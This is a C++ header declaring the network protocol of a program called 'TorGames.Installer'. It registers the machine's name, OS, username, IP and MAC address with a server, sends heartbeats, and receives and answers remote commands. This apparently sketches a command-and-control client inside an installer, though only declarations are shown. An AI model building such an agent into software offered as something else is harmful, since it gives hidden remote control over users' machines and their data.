// TorGames.Installer - Network protocol
#pragma once

#include "common.h"

struct ServerMessage {
    std::string type;       // "accepted", "error", "command"
    std::string commandId;
    std::string commandType;
    std::string commandText;
    int timeout = 0;
};

class Protocol {
public:
    Protocol();
    ~Protocol();

    bool Connect(const char* host, int port);
    void Disconnect();
    bool IsConnected() const { return m_connected; }

    bool SendRegistration(const char* clientId, const char* machineName,
        const char* osVersion, const char* osArch, int cpuCount, long long totalMemory,
        const char* username, const char* version, const char* ipAddress,
        const char* macAddress);
    bool SendHeartbeat(long long uptime, long long availMemory);
    bool SendCommandResponse(const char* commandId, bool success, const char* result);

    bool ReceiveMessage(ServerMessage& msg, int timeoutMs = 1000);

private:
    bool Send(const char* data, int len);
    bool Receive(std::string& data, int timeoutMs);

    SOCKET m_socket = INVALID_SOCKET;
    bool m_connected = false;
    CRITICAL_SECTION m_sendCs;
};
